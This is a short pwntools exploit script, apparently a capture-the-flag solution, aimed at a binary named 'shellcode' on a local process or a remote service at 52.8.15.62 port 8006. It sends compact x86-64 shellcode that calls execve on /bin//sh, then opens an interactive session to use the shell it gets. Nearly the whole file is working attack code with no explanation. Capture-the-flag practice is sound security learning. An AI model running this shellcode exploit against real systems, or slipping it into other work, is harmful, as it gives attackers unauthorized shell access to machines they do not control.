from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./shellcode"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("52.8.15.62", 8006)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


payload = asm('''
                     xor    rsi, rsi            
                     push   rsi
                     movabs rdi, 0x68732f2f6e69622f     
                     push   rdi
                     push   rsp
                     pop    rdi                        
                     push   0x3b
                     pop    rax                       
                     cdq
                     syscall

''')
log.success(len(payload))
ddebug("b *0x40116E\ncontinue")
io.sendlineafter("keep it shrt!", payload)

io.interactive()
